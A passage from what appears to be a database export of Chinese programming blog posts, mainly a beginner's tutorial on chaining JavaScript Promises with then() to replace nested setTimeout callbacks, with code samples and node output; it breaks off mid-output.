arr.map(fn)]\u003c/code\u003e定义了\u003ccode\u003ea\u003c/code\u003e的基础上去运用后面的\u003ccode\u003ereduce\u003c/code\u003e方法，最后返回\u003ccode\u003ereduce\u003c/code\u003e方法的结果。\u003c/p\u003e\n\u003cp\u003e可以看出，先定义了一个长度为2的数组\u003ccode\u003ea\u003c/code\u003e，索引\u003ccode\u003e0\u003c/code\u003e对应值为数组\u003ccode\u003earr\u003c/code\u003e，索引\u003ccode\u003e1\u003c/code\u003e对应值为数组\u003ccode\u003earr\u003c/code\u003e调用\u003ccode\u003efn\u003c/code\u003e后的\u003ccode\u003emap\u003c/code\u003e结果数组。然后去\u003ccode\u003ereduce\u003c/code\u003e生成以\u003ccode\u003earr\u003c/code\u003e元素值为对象键（即\u003ccode\u003eval\u003c/code\u003e，也即\u003ccode\u003ea[0]\u003c/code\u003e数组遍历过程中的元素值），以对应该元素值调用\u003ccode\u003efn\u003c/code\u003e后的结果值（即\u003ccode\u003ea[1][ind]\u003c/code\u003e）为对象值的对象。这个对象就是最终想要的结果。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e另外，打一波广告：一个时间处理库：\u003ca target=\"_blank\" href=\"https://github.com/hongmaoxiao/now\"\u003enow.js\u003c/a\u003e，觉得还行的话，点个赞再走呗。。。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e微信公众号：\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/s/I0NzqaeGcFbMJZ98FK4maQ\"\u003eJavaScript30秒， 从入门到放弃之Array（三）\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n","buildTime":"1514894771.8916","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3de"},"id":"5a4714e3f265da431d3d0407","author":{"$oid":"5a4b76338b69bb25d83da3c6"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"使用Promise解决多层异步调用的简单学习","meta":{"likeCount":0},"tag":["Promise","Microsoft","前端","JavaScript"],"comment":[],"shortContent":"第一次接触到Promise这个东西，是2012年微软发布Windows8操作系统后抱着作死好奇的心态研究用html5写Metro应用的时候。当时配合html5提供的WinJS库里面的异步接口全都是Promise形式，这对那时候刚刚毕业一点javascript基础都没有的我而言简…","content":"\u003cp\u003e#前言\n第一次接触到Promise这个东西，是2012年微软发布Windows8操作系统后抱着\u003cs\u003e作死\u003c/s\u003e好奇的心态研究用html5写Metro应用的时候。当时配合html5提供的WinJS库里面的异步接口全都是Promise形式，这对那时候刚刚毕业一点javascript基础都没有的我而言简直就是天书。我当时想的是，微软又在脑洞大开的瞎捣鼓了。\u003c/p\u003e\n\u003cp\u003e结果没想到，到了2015年，Promise居然写进ES6标准里面了。而且一项\u003ca target=\"_blank\" href=\"http://www.oschina.net/news/69039/javascript-developer-survey-results\"\u003e调查\u003c/a\u003e显示，js程序员们用这玩意用的还挺high。\u003c/p\u003e\n\u003cp\u003e讽刺的是，作为早在2012年就在Metro应用开发接口里面广泛使用Promise的微软，其自家浏览器IE直到2015年寿终正寝了都还不支持Promise，看来微软不是没有这个技术，而是真的对IE放弃治疗了。。。\u003c/p\u003e\n\u003cp\u003e现在回想起来，当时看到Promise最头疼的，就是初学者看起来匪夷所思，也是最被js程序员广为称道的特性：\u003ccode\u003ethen\u003c/code\u003e函数调用链。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ethen\u003c/code\u003e函数调用链，从其本质上而言，就是对多个异步过程的依次调用，本文就从这一点着手，对Promise这一特性进行研究和学习。\u003c/p\u003e\n\u003cp\u003e#Promise解决的问题\u003c/p\u003e\n\u003cp\u003e考虑如下场景，函数延时2秒之后打印一行日志，再延时3秒打印一行日志，再延时4秒打印一行日志，这在其他的编程语言当中是非常简单的事情，但是到了js里面就比较费劲，代码大约会写成下面的样子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e myfunc = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\u0009\n\u0009setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"log1\"\u003c/span\u003e);\n\u0009\u0009setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"log2\"\u003c/span\u003e);\n\u0009\u0009\u0009setTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"log3\"\u003c/span\u003e);\n\u0009\u0009\u0009}, \u003cspan class=\"hljs-number\"\u003e4000\u003c/span\u003e);\n\u0009\u0009}, \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e); \n\u0009}, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于嵌套了多层回调结构，这里形成了一个典型的金字塔结构。如果业务逻辑再复杂一些，就会变成令人闻风丧胆的回调地狱。\u003c/p\u003e\n\u003cp\u003e如果意识比较好，知道提炼出简单的函数，那么代码差不多是这个样子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e func1 = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009setTimeout(func2, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n};\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e func2 = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"log1\"\u003c/span\u003e);\n\u0009setTimeout(func3, \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e);\n};\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e func3 = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"log2\"\u003c/span\u003e);\n\u0009setTimeout(func4, \u003cspan class=\"hljs-number\"\u003e4000\u003c/span\u003e);\n};\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e func4 = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"log3\"\u003c/span\u003e);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样看起来稍微好一点了，但是总觉得有点怪怪的。。。好吧，其实我js水平有限，说不上来为什么这样写不好。如果你知道为什么这样写不太好所以发明了Promise，请告诉我。\u003c/p\u003e\n\u003cp\u003e现在让我们言归正传，说说Promise这个东西。\u003c/p\u003e\n\u003cp\u003e#Promise的描述\u003c/p\u003e\n\u003cp\u003e这里请允许我引用MDN对Promise的描述：\u003c/p\u003e\n\u003cp\u003ePromise 对象用于延迟(deferred) 计算和异步(asynchronous ) 计算.。一个Promise对象代表着一个还未完成，但预期将来会完成的操作。\u003c/p\u003e\n\u003cp\u003ePromise 对象是一个返回值的代理，这个返回值在promise对象创建时未必已知。它允许你为异步操作的成功或失败指定处理方法。 这使得异步方法可以像同步方法那样返回值：异步方法会返回一个包含了原返回值的 promise 对象来替代原返回值。\u003c/p\u003e\n\u003cp\u003ePromise对象有以下几种状态:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003epending: 初始状态, 非 fulfilled 或 rejected。\u003c/li\u003e\n\u003cli\u003efulfilled: 成功的操作。\u003c/li\u003e\n\u003cli\u003erejected: 失败的操作。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003epending状态的promise对象既可转换为带着一个成功值的fulfilled 状态，也可变为带着一个失败信息的 rejected 状态。当状态发生转换时，promise.then绑定的方法（函数句柄）就会被调用。(当绑定方法时，如果 promise对象已经处于 fulfilled 或 rejected 状态，那么相应的方法将会被立刻调用， 所以在异步操作的完成情况和它的绑定方法之间不存在竞争条件。)\u003c/p\u003e\n\u003cp\u003e更多关于Promise的描述和示例可以参考MDN的\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise\"\u003ePromise\u003c/a\u003e条目，或者MSDN的\u003ca target=\"_blank\" href=\"https://msdn.microsoft.com/zh-cn/library/dn802826(v=vs.94).aspx\"\u003ePromise\u003c/a\u003e条目。\u003c/p\u003e\n\u003cp\u003e#尝试使用Promise解决我们的问题\u003c/p\u003e\n\u003cp\u003e基于以上对Promise的了解，我们知道可以使用它来解决多层回调嵌套后的代码蠢笨难以维护的问题。关于Promise的语法和参数上面给出的两个链接已经说的很清楚了，这里不重复，直接上代码。\u003c/p\u003e\n\u003cp\u003e我们先来尝试一个比较简单的情况，只执行一次延时和回调：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout\"\u003c/span\u003e);\n\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout call back\"\u003c/span\u003e);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看起来和MSDN里的示例也没什么区别，执行结果如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ node promisTest.js\n1450194136374 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout\n1450194138391 timeout call back\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e那么如果我们要再做一个延时呢，那么我可以这样写：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 1\"\u003c/span\u003e);\n\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 1 call back\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 2\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e);\n\u0009}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 2 call back\"\u003c/span\u003e);\n\u0009})\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e似乎也能正确运行：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ node promisTest.js\n1450194338710 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 1\n1450194340720 timeout 1 call back\n1450194340720 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 2\n1450194343722 timeout 2 call back\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e不过代码看起来蠢萌蠢萌的是不是，而且隐约又在搭金字塔了。这和引入Promise的目的背道而驰。\u003c/p\u003e\n\u003cp\u003e那么问题出在哪呢？正确的姿势又是怎样的？\u003c/p\u003e\n\u003cp\u003e答案藏在\u003ccode\u003ethen\u003c/code\u003e函数以及\u003ccode\u003ethen\u003c/code\u003e函数的\u003ccode\u003eonFulfilled\u003c/code\u003e（或者叫\u003ccode\u003eonCompleted\u003c/code\u003e）回调函数的返回值里面。\u003c/p\u003e\n\u003cp\u003e首先明确的一点是，\u003ccode\u003ethen\u003c/code\u003e函数会返回一个新的Promise变量，你可以再次调用这个新的Promise变量的\u003ccode\u003ethen\u003c/code\u003e函数，像这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(...).then(...)\n\u0009.then(...).then(...).then(...)...\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e而\u003ccode\u003ethen\u003c/code\u003e函数返回的是什么样的Promies，取决于\u003ccode\u003eonFulfilled\u003c/code\u003e回调的返回值。\u003c/p\u003e\n\u003cp\u003e事实上，\u003ccode\u003eonFulfilled\u003c/code\u003e可以返回一个普通的变量，也可以是另一个Promise变量。\u003c/p\u003e\n\u003cp\u003e如果\u003ccode\u003eonFulfilled\u003c/code\u003e返回的是一个普通的值，那么\u003ccode\u003ethen\u003c/code\u003e函数会返回一个默认的Promise变量。执行这个Promise的\u003ccode\u003ethen\u003c/code\u003e函数会使Promise立即被满足，执行\u003ccode\u003eonFulfilled\u003c/code\u003e函数，而这个\u003ccode\u003eonFulfilled\u003c/code\u003e的入参，即是上一个\u003ccode\u003eonFulfilled\u003c/code\u003e的返回值。\u003c/p\u003e\n\u003cp\u003e而如果\u003ccode\u003eonFulfilled\u003c/code\u003e返回的是一个Promise变量，那个这个Promise变量就会作为\u003ccode\u003ethen\u003c/code\u003e函数的返回值。\u003c/p\u003e\n\u003cp\u003e关于\u003ccode\u003ethen\u003c/code\u003e函数和\u003ccode\u003eonFulfilled\u003c/code\u003e函数的返回值的这一系列设定，MDN和MSDN上的文档都没有明确的正面描述，至于ES6官方文档\u003ca target=\"_blank\" href=\"http://www.ecma-international.org/ecma-262/6.0/#sec-promise-objects\"\u003eECMAScript 2015 (6th Edition, ECMA-262)\u003c/a\u003e。。。我的水平有限实在看不懂，如果哪位高手能解释清楚官方文档里面对着两个返回值的描述，请一定留言指教！！！\u003c/p\u003e\n\u003cp\u003e所以以上为我的自由发挥，语言组织的有点拗口，上代码看一下大家就明白了。\u003c/p\u003e\n\u003cp\u003e首先是返回普通变量的情况：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 1\"\u003c/span\u003e);\n\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 1 call back\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e;\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003earg\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" last onFulfilled return \"\u003c/span\u003e + arg);\u0009\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上代码执行结果为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ node promisTest.js\n1450277122125 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 1\n1450277124129 timeout 1 call back\n1450277124129 last onFulfilled \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1024\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有点意思对不对，但这不是关键。关键是\u003ccode\u003eonFulfilled\u003c/code\u003e函数返回一个Promise变量可以使我们很方便的连续调用多个异步过程。比如我们可以这样来尝试连续做两个延时操作：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 1\"\u003c/span\u003e);\n\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 1 call back\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 2\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e);\n\u0009});\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 2 call back\"\u003c/span\u003e);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e执行结果如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ node promisTest.js\n1450277510275 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 1\n1450277512276 timeout 1 call back\n1450277512276 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 2\n1450277515327 timeout 2 call back\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果觉得这也没什么了不起，那再多来几次也不在话下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 1\"\u003c/span\u003e);\n\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e);\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 1 call back\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 2\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e);\n\u0009});\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 2 call back\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 3\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e4000\u003c/span\u003e);\n\u0009});\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 3 call back\"\u003c/span\u003e);\n\u0009\u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eres, rej\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" start setTimeout 4\"\u003c/span\u003e);\n\u0009\u0009setTimeout(res, \u003cspan class=\"hljs-number\"\u003e5000\u003c/span\u003e);\n\u0009});\n}).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now() + \u003cspan class=\"hljs-string\"\u003e\" timeout 4 call back\"\u003c/span\u003e);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ node promisTest.js\n1450277902714 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 1\n1450277904722 timeout 1 call back\n1450277904724 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 2\n1450277907725 timeout 2 call back\n1450277907725 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 3\n1450277911730 timeout 3 call back\n1450277911730 start \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout 4\n1450277916744 timeout 4 call 